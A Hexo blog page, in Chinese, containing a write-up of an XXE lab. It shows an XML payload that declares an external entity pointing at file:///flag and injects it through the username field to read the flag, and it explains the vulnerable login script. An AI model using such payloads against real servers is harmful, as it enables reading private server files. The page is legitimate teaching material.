@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XXE-labs 我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出  ​  同时 F12 进行前端查看 发现 在提交按钮处有 ​&lt;button id&#x3D;&quot;go&quot; onclick&#x3D;&quot;XMLFunction()&quot;&gt;GO!&lt;&#x2F;button&gt;​  &#x3D;&#x3D;说明我们的 数据传输方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XXE-labs 我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出  ​  同时 F12 进行前端查看 发现 在提交按钮处有 ​&lt;button id&#x3D;&quot;go&quot; onclick&#x3D;&quot;XMLFunction()&quot;&gt;GO!&lt;&#x2F;button&gt;​  &#x3D;&#x3D;说明我们的 数据传输方">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//image-20250422222903-k9ji6kx.png">
+<meta property="og:image" content="http://example.com/.com//image-20250422223115-kr6nf3v.png">
+<meta property="og:image" content="http://example.com/.com//40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png">
+<meta property="og:image" content="http://example.com/.com//454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png">
+<meta property="article:published_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:modified_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//image-20250422222903-k9ji6kx.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/XXE（XML外部实体注入）/XXE-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h1><blockquote>
+<p>我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出</p>
+</blockquote>
+<p><img src="/.com//image-20250422222903-k9ji6kx.png" alt="image">​</p>
+<blockquote>
+<p>同时 F12 进行前端查看 发现 在提交按钮处有</p>
+<p>​<code>&lt;button id=&quot;go&quot; onclick=&quot;XMLFunction()&quot;&gt;GO!&lt;/button&gt;</code>​</p>
+</blockquote>
+<p>&#x3D;&#x3D;说明我们的 数据传输方式为 xml&#x3D;&#x3D;<br> 当然，我们也可以直接 在burp suite 进行抓包查看</p>
+<p><img src="/.com//image-20250422223115-kr6nf3v.png" alt="image">​</p>
+<blockquote>
+<p>我们看到了 xml 文档声明：</p>
+<p>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>​</p>
+</blockquote>
+<p>所以，可能存在 xxe 漏洞</p>
+<p> 我们构造payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag<br>有人可能会问 flag 也不会是 dtd 文件啊<br>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件<br>造成漏洞，这就是xxe</p>
+</blockquote>
+<p>所以到了这个时候，我们也就能够明白我们上面构造的payload的含义了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span>    <span class="comment">&lt;!--使用admin实体--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>                        <span class="comment">&lt;!--声明admin实体--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入</p>
+<p> 点击 go 发现 flag</p>
+<p><img src="/.com//40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png" alt="40ff3cea6e98dbb09db72be6393d5d29"></p>
+<p>当然在这里我们也可以 使用 postman （本质是一样的，都是传递参数 将我们的payload传递到后台 php）</p>
+<p> 我们查看源代码，发现是 post 传参</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>; &lt;!--转化数据格式   串行格式化数据--&gt;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();   &lt;!--实例化<span class="title class_">XMLHttpRequest</span> 对象--&gt;</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; &lt;!--页面初始化--&gt;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123; &lt;!--实时跟踪异步响应状态，监听函数 readyState4 数据接收完毕  此时可以获取完整的响应数据--&gt;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);  &lt;!--接受数据--&gt;</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);&lt;!--弹窗 接受数据--&gt;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>); &lt;!---建立 post请求，要求异步响应   xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">false</span>)--&gt;</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);  &lt;!--发送请求--&gt;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面有两点值得我们注意：</p>
+<ol>
+<li>是 post 传参</li>
+<li>接受地址是 login.php</li>
+</ol>
+<p> 现在我们使用 postman 了</p>
+<p><img src="/.com//454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png" alt="454b83cf5da1b573bd3c3081543785ab">​</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" data-id="cmawal1j5001mbo7k0c7yb0fy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wireshark/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/dirsearch/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
